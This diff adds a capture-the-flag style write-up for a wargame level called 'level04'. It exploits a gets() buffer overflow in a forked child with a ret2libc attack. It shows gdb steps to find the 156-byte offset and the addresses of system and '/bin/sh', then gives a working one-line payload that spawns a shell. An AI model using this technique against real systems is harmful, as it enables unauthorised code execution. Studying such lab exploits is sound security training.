@@ -1,0 +1,50 @@
+The program uses fork(), and it is the childs that does the insecure gets().
+
+According to https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
+we need to set the follow-fork-mode to child to follow the child and see what appens when it segfaults:
+
+(gdb) set follow-fork-mode child
+
+We will try a ret to libc attack, we will override the stack to call system("/bin/sh")
+
+Find the offset:
+(gdb) r < <(python -c "print 'a' * 128 + 'bbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll'")
+
+Segfault at 0x69696969, 0x69 = 'i', the offset is 128 + 28 = 156
+
+Let's find the adress of the "system" function:
+
+(gdb) info func system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+The adress of system is 0xf7e6aed0
+
+Let's find the adress of the string "/bin/sh":
+
+(gdb) info proc map
+Mapped address spaces:
+	Start Addr   End Addr       Size     Offset objfile
+	...
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	...
+
+(gdb) find 0xf7e2c000,+0x1a0000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+The adress of the "/bin/sh" string is 0xf7f897ec
+
+Our exploit will then be:
+
+<156 bytes of padding><adress of system><4 bytes for the return pointer><the adress of "/bin/sh"> :
+
+(python -c "print '.' * 156 + '\xd0\xae\xe6\xf7' + '....' + '\xec\x97\xf8\xf7'" && cat) | ./level04
+
+and we have a shell, there is no need for a shellcode :p
